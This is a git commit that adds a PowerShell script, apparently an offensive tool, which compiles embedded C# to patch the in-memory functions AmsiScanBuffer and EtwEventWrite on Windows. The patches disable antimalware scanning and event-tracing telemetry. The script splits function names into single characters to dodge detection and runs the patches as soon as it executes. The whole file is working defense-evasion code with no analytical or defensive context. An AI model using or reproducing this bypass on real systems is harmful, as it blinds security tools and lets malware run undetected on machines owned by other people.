405efabbe33134af64cb5ac32749c653c00a09c2
LoneNone1807 <161996830+LoneNone1807@users.noreply.github.com>
2024-07-07 12:47:00 +0700

    Add files via upload

---
+++ amsi-etw.ps1
@@ -0,0 +1,54 @@
+$amsixetwpatch = @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+public class Patcher
+{
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
+
+    public static bool PatchAmsi()
+    {
+        IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + "." + "d" + "l" + "l");
+        if (h == IntPtr.Zero) return false;
+        IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
+        if (a == IntPtr.Zero) return false;
+        UInt32 oldProtect;
+        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
+        byte[] patch = { 0x31, 0xC0, 0xC3 };
+        Marshal.Copy(patch, 0, a, patch.Length);
+        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
+    }
+
+    public static void PatchEtwEventWrite()
+    {
+        const uint PAGE_EXECUTE_READWRITE = 0x40;
+        string ntdllModuleName = "ntdll.dll";
+        string etwEventWriteFunctionName = "EtwEventWrite";
+
+        IntPtr ntdllModuleHandle = GetModuleHandle(ntdllModuleName);
+        IntPtr etwEventWriteAddress = GetProcAddress(ntdllModuleHandle, etwEventWriteFunctionName);
+
+        byte[] retOpcode = { 0xC3 };
+
+        uint oldProtect;
+        VirtualProtect(etwEventWriteAddress, (UIntPtr)retOpcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
+        
+        int bytesWritten;
+        WriteProcessMemory(Process.GetCurrentProcess().Handle, etwEventWriteAddress, retOpcode, (uint)retOpcode.Length, out bytesWritten);
+    }
+}
+"@
+Add-Type -TypeDefinition $amsixetwpatch -Language CSharp
+[Patcher]::PatchAmsi()
+[Patcher]::PatchEtwEventWrite()
